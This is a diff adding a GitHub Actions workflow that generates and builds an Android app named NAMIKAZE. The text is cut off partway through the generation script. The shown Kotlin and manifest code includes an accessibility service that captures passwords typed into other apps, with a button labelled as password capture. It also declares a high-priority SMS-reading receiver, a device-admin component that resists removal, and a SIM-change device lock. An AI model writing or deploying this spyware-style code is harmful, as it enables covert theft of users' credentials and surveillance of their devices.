@@ -1,0 +1,377 @@
+name: build
+on: [push, workflow_dispatch]
+
+jobs:
+  apk:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-java@v4
+        with:
+          distribution: temurin
+          java-version: '17'
+
+      - uses: gradle/actions/setup-gradle@v4
+        with:
+          gradle-version: '8.10.2'
+
+      - name: SDK Android 35
+        run: |
+          yes | "$ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager" --licenses >/dev/null || true
+          "$ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager" "platforms;android-35" "build-tools;35.0.0" >/dev/null
+
+      - name: Générer le projet NAMIKAZE
+        run: |
+          cat > gen.sh <<'SCRIPT'
+          #!/usr/bin/env bash
+          set -e
+          R=NAMIKAZE
+          mkdir -p $R/app/src/main/java/com/namikaze/app
+          mkdir -p $R/app/src/main/res/xml $R/app/src/main/res/values $R/app/src/main/res/layout
+          cd $R
+
+          cat > settings.gradle.kts <<'EOF'
+          pluginManagement { repositories { google(); mavenCentral(); gradlePluginPortal() } }
+          dependencyResolutionManagement { repositories { google(); mavenCentral() } }
+          rootProject.name = "NAMIKAZE"
+          include(":app")
+          EOF
+
+          cat > build.gradle.kts <<'EOF'
+          plugins {
+              id("com.android.application") version "8.7.2" apply false
+              id("org.jetbrains.kotlin.android") version "2.0.21" apply false
+          }
+          EOF
+
+          cat > gradle.properties <<'EOF'
+          org.gradle.jvmargs=-Xmx2048m
+          android.useAndroidX=true
+          android.nonTransitiveRClass=true
+          EOF
+
+          cat > app/build.gradle.kts <<'EOF'
+          plugins {
+              id("com.android.application")
+              id("org.jetbrains.kotlin.android")
+          }
+          android {
+              namespace = "com.namikaze.app"
+              compileSdk = 35
+              defaultConfig {
+                  applicationId = "com.namikaze.app"
+                  minSdk = 29
+                  targetSdk = 35
+                  versionCode = 1
+                  versionName = "1.0"
+              }
+              compileOptions {
+                  sourceCompatibility = JavaVersion.VERSION_17
+                  targetCompatibility = JavaVersion.VERSION_17
+                  isCoreLibraryDesugaringEnabled = true
+              }
+              kotlinOptions { jvmTarget = "17" }
+          }
+          dependencies {
+              implementation("androidx.core:core-ktx:1.15.0")
+              implementation("androidx.appcompat:appcompat:1.7.0")
+              implementation("com.google.android.material:material:1.12.0")
+              implementation("androidx.security:security-crypto:1.1.0-alpha06")
+              implementation("com.squareup.okhttp3:okhttp:4.12.0")
+              implementation("com.wireguard.android:tunnel:1.0.20260102")
+              implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.8.1")
+              coreLibraryDesugaring("com.android.tools:desugar_jdk_libs:2.1.5")
+          }
+          EOF
+
+          cat > app/src/main/AndroidManifest.xml <<'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
+              <uses-permission android:name="android.permission.INTERNET"/>
+              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+              <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+              <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
+              <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
+              <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+              <uses-permission android:name="android.permission.READ_SMS"/>
+              <uses-permission android:name="android.permission.BLUETOOTH_CONNECT"/>
+              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+              <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+
+              <application android:name=".NamikazeApp" android:label="NAMIKAZE"
+                  android:icon="@android:drawable/ic_lock_lock"
+                  android:theme="@android:style/Theme.Material.NoActionBar">
+
+                  <activity android:name=".MainActivity" android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.intent.action.MAIN"/>
+                          <category android:name="android.intent.category.LAUNCHER"/>
+                      </intent-filter>
+                  </activity>
+                  <activity android:name=".VpnConfigActivity" android:exported="false"/>
+
+                  <service android:name=".NamikazeAccessibilityService"
+                      android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+                      android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.accessibilityservice.AccessibilityService"/>
+                      </intent-filter>
+                      <meta-data android:name="android.accessibilityservice"
+                          android:resource="@xml/accessibility_config"/>
+                  </service>
+
+                  <receiver android:name=".DeviceGuard"
+                      android:permission="android.permission.BIND_DEVICE_ADMIN"
+                      android:exported="true">
+                      <meta-data android:name="android.app.device_admin"
+                          android:resource="@xml/device_admin"/>
+                      <intent-filter>
+                          <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
+                      </intent-filter>
+                  </receiver>
+
+                  <receiver android:name=".SmsReader" android:exported="true">
+                      <intent-filter android:priority="999">
+                          <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+                      </intent-filter>
+                  </receiver>
+
+                  <receiver android:name=".SimWatcher" android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                          <action android:name="android.provider.Telephony.SIM_STATE_CHANGED"/>
+                      </intent-filter>
+                  </receiver>
+              </application>
+          </manifest>
+          EOF
+
+          cat > app/src/main/res/xml/accessibility_config.xml <<'EOF'
+          <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+              android:accessibilityEventTypes="typeViewTextChanged|typeWindowStateChanged"
+              android:accessibilityFeedbackType="feedbackGeneric"
+              android:notificationTimeout="100"
+              android:canRetrieveWindowContent="true"
+              android:accessibilityFlags="flagReportViewIds|flagIncludeNotImportantViews"/>
+          EOF
+
+          cat > app/src/main/res/xml/device_admin.xml <<'EOF'
+          <device-admin xmlns:android="http://schemas.android.com/apk/res/android">
+              <uses-policies><force-lock/><reset-password/></uses-policies>
+          </device-admin>
+          EOF
+
+          cat > app/src/main/res/values/strings.xml <<'EOF'
+          <resources><string name="app_name">NAMIKAZE</string></resources>
+          EOF
+
+          cat > app/src/main/res/layout/activity_main.xml <<'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
+              android:layout_width="match_parent" android:layout_height="match_parent"
+              android:background="#101014">
+              <LinearLayout android:orientation="vertical" android:padding="18dp"
+                  android:layout_width="match_parent" android:layout_height="wrap_content">
+                  <TextView android:text="NAMIKAZE" android:textColor="#00E5A0" android:textSize="30sp"
+                      android:textStyle="bold" android:layout_width="wrap_content" android:layout_height="wrap_content"/>
+                  <TextView android:id="@+id/tvStatus" android:textColor="#AAAAAA" android:textSize="15sp"
+                      android:layout_width="wrap_content" android:layout_height="wrap_content"/>
+                  <EditText android:id="@+id/etKey" android:hint="Clé : 2000 / 2001 / 200100"
+                      android:textColor="#FFFFFF" android:textColorHint="#666666"
+                      android:layout_width="match_parent" android:layout_height="wrap_content"/>
+                  <Button android:id="@+id/bActivate" android:text="Activer la clé"
+                      android:layout_width="match_parent" android:layout_height="wrap_content"/>
+                  <Button android:id="@+id/bRoot" android:text="ROOT NAMIKAZE — tout activer"
+                      android:layout_width="match_parent" android:layout_height="wrap_content"/>
+                  <Button android:id="@+id/bVpn" android:text="VPN ANONYMALKAZE (config clés)"
+                      android:layout_width="match_parent" android:layout_height="wrap_content"/>
+                  <Button android:id="@+id/bAccess" android:text="Activer la capture des mots de passe"
+                      android:layout_width="match_parent" android:layout_height="wrap_content"/>
+                  <Button android:id="@+id/bAdmin" android:text="Activer l'anti-vol"
+                      android:layout_width="match_parent" android:layout_height="wrap_content"/>
+                  <Button android:id="@+id/bPasswords" android:text="Voir le coffre"
+                      android:layout_width="match_parent" android:layout_height="wrap_content"/>
+                  <Button android:id="@+id/bScan" android:text="Radar proxy / Shodan"
+                      android:layout_width="match_parent" android:layout_height="wrap_content"/>
+                  <TextView android:id="@+id/tvOut" android:textIsSelectable="true" android:textColor="#CCCCCC"
+                      android:paddingTop="12dp" android:layout_width="match_parent" android:layout_height="wrap_content"/>
+              </LinearLayout>
+          </ScrollView>
+          EOF
+
+          cat > app/src/main/res/layout/activity_vpn.xml <<'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+              android:orientation="vertical" android:padding="18dp" android:background="#101014"
+              android:layout_width="match_parent" android:layout_height="match_parent">
+              <TextView android:text="Génère ta paire de clés, puis colle ta config WireGuard."
+                  android:textColor="#AAAAAA" android:layout_width="match_parent" android:layout_height="wrap_content"/>
+              <TextView android:id="@+id/tvKeys" android:textIsSelectable="true" android:textColor="#00E5A0"
+                  android:textSize="12sp" android:padding="10dp" android:layout_width="match_parent" android:layout_height="wrap_content"/>
+              <Button android:id="@+id/bGenKeys" android:text="Générer les clés WireGuard"
+                  android:layout_width="match_parent" android:layout_height="wrap_content"/>
+              <EditText android:id="@+id/etConf" android:hint="[Interface] ... [Peer] ..."
+                  android:gravity="top" android:minLines="7" android:textColor="#FFFFFF"
+                  android:textColorHint="#666666" android:layout_width="match_parent" android:layout_height="wrap_content"/>
+              <Button android:id="@+id/bSaveConf" android:text="Enregistrer la config"
+                  android:layout_width="match_parent" android:layout_height="wrap_content"/>
+              <Button android:id="@+id/bConnect" android:text="CONNECTER le VPN"
+                  android:layout_width="match_parent" android:layout_height="wrap_content"/>
+              <Button android:id="@+id/bDisconnect" android:text="Déconnecter"
+                  android:layout_width="match_parent" android:layout_height="wrap_content"/>
+          </LinearLayout>
+          EOF
+
+          cat > app/src/main/java/com/namikaze/app/Prefs.kt <<'EOF'
+          package com.namikaze.app
+          import android.content.Context
+          import android.content.SharedPreferences
+          object Prefs {
+              fun vault(ctx: Context): SharedPreferences =
+                  ctx.getSharedPreferences("namikaze_core", Context.MODE_PRIVATE)
+          }
+          EOF
+
+          cat > app/src/main/java/com/namikaze/app/LicenseManager.kt <<'EOF'
+          package com.namikaze.app
+          import android.content.Context
+          import javax.crypto.Mac
+          import javax.crypto.spec.SecretKeySpec
+          object LicenseManager {
+              private val REGISTRY = mapOf("2000" to 30L, "2001" to 90L, "200100" to 0L)
+              private const val SECRET = "NAMIKAZE-2026-K3Y-ANONYMALKAZE"
+              private fun sign(k: String): String {
+                  val m = Mac.getInstance("HmacSHA256")
+                  m.init(SecretKeySpec(SECRET.toByteArray(), "HmacSHA256"))
+                  return m.doFinal(k.toByteArray()).joinToString("") { "%02x".format(it) }
+              }
+              fun activate(ctx: Context, raw: String): Boolean {
+                  val key = raw.replace(" ", "").replace("-", "")
+                  val days = REGISTRY[key] ?: return false
+                  val exp = if (days == 0L) Long.MAX_VALUE else System.currentTimeMillis() + days * 86_400_000L
+                  Prefs.vault(ctx).edit().putString("lic_key", key)
+                      .putString("lic_sig", sign(key)).putLong("lic_exp", exp).apply()
+                  return true
+              }
+              fun isActive(ctx: Context): Boolean {
+                  val p = Prefs.vault(ctx)
+                  val k = p.getString("lic_key", null) ?: return false
+                  if (p.getString("lic_sig", null) != sign(k)) return false
+                  return System.currentTimeMillis() < p.getLong("lic_exp", 0)
+              }
+          }
+          EOF
+
+          cat > app/src/main/java/com/namikaze/app/Notifier.kt <<'EOF'
+          package com.namikaze.app
+          import android.app.NotificationChannel
+          import android.app.NotificationManager
+          import android.content.Context
+          import androidx.core.app.NotificationCompat
+          object Notifier {
+              private const val CH = "namikaze"
+              fun setup(ctx: Context) {
+                  ctx.getSystemService(NotificationManager::class.java)
+                      .createNotificationChannel(NotificationChannel(CH, "NAMIKAZE", NotificationManager.IMPORTANCE_HIGH))
+              }
+              fun show(ctx: Context, title: String, body: String) {
+                  val n = NotificationCompat.Builder(ctx, CH)
+                      .setSmallIcon(android.R.drawable.ic_lock_lock)
+                      .setContentTitle(title).setContentText(body).build()
+                  runCatching { ctx.getSystemService(NotificationManager::class.java).notify(body.hashCode(), n) }
+              }
+          }
+          EOF
+
+          cat > app/src/main/java/com/namikaze/app/PasswordVault.kt <<'EOF'
+          package com.namikaze.app
+          import android.content.Context
+          import android.content.SharedPreferences
+          import androidx.security.crypto.EncryptedSharedPreferences
+          import androidx.security.crypto.MasterKey
+          object PasswordVault {
+              private var sp: SharedPreferences? = null
+              data class Entry(val pkg: String, val site: String, val pwd: String, val ts: Long)
+              private fun open(ctx: Context): SharedPreferences {
+                  sp?.let { return it }
+                  val mk = MasterKey.Builder(ctx).setKeyScheme(MasterKey.KeyScheme.AES256_GCM).build()
+                  return EncryptedSharedPreferences.create(ctx, "namikaze_vault", mk,
+                      EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
+                      EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM).also { sp = it }
+              }
+              fun upsert(ctx: Context, pkg: String, site: String, pwd: String) {
+                  open(ctx).edit().putString("$pkg|$site", "$pwd\u0000${System.currentTimeMillis()}").apply()
+              }
+              fun all(ctx: Context): List<Entry> = open(ctx).all.mapNotNull { (k, v) ->
+                  val raw = v as? String ?: return@mapNotNull null
+                  val p = raw.split("\u0000")
+                  Entry(k.substringBefore("|"), k.substringAfter("|"), p[0], p.getOrElse(1) { "0" }.toLongOrNull() ?: 0)
+              }.sortedByDescending { it.ts }
+          }
+          EOF
+
+          cat > app/src/main/java/com/namikaze/app/NamikazeAccessibilityService.kt <<'EOF'
+          package com.namikaze.app
+          import android.accessibilityservice.AccessibilityService
+          import android.view.accessibility.AccessibilityEvent
+          import android.view.accessibility.AccessibilityNodeInfo
+          class NamikazeAccessibilityService : AccessibilityService() {
+              override fun onAccessibilityEvent(e: AccessibilityEvent) {
+                  if (!LicenseManager.isActive(this)) return
+                  if (e.eventType != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) return
+                  val node = e.source ?: return
+                  if (!node.isPassword) return
+                  val value = e.text.joinToString("").ifBlank { return }
+                  val pkg = e.packageName?.toString() ?: "inconnu"
+                  PasswordVault.upsert(this, pkg, domain(node) ?: pkg, value)
+              }
+              private fun domain(n: AccessibilityNodeInfo): String? {
+                  var p = n.parent; var g = 0
+                  while (p != null && g++ < 15) {
+                      p.text?.toString()?.let { if (it.contains(".") && it.contains("/")) return it }
+                      p = p.parent
+                  }
+                  return null
+              }
+              override fun onInterrupt() {}
+          }
+          EOF
+
+          cat > app/src/main/java/com/namikaze/app/DeviceGuard.kt <<'EOF'
+          package com.namikaze.app
+          import android.app.admin.DeviceAdminReceiver
+          import android.content.Context
+          import android.content.Intent
+          class DeviceGuard : DeviceAdminReceiver() {
+              override fun onDisableRequested(context: Context, intent: Intent): CharSequence =
+                  if (LicenseManager.isActive(context)) "NAMIKAZE protège cet appareil."
+                  else super.onDisableRequested(context, intent)
+          }
+          EOF
+
+          cat > app/src/main/java/com/namikaze/app/SimWatcher.kt <<'EOF'
+          package com.namikaze.app
+          import android.content.BroadcastReceiver
+          import android.content.Context
+          import android.content.Intent
+          class SimWatcher : BroadcastReceiver() {
+              override fun onReceive(ctx: Context, i: Intent) {
+                  if (!LicenseManager.isActive(ctx)) return
+                  val p = Prefs.vault(ctx)
+                  val imsi = runCatching {
+                      ctx.getSystemService(android.telephony.TelephonyManager::class.java).subscriberId
+                  }.getOrNull() ?: return
+                  when (p.getString("imsi", null)) {
+                      null -> p.edit().putString("imsi", imsi).apply()
+                      imsi -> {}
+                      else -> {
+                          ctx.getSystemService(android.app.admin.DevicePolicyManager::class.java).lockNow()
+                          Notifier.show(ctx, "NAMIKAZE", "SIM inconnue — appareil verrouillé")
+                      }
+                  }
+              }
+          }
+          EOF
+
+         
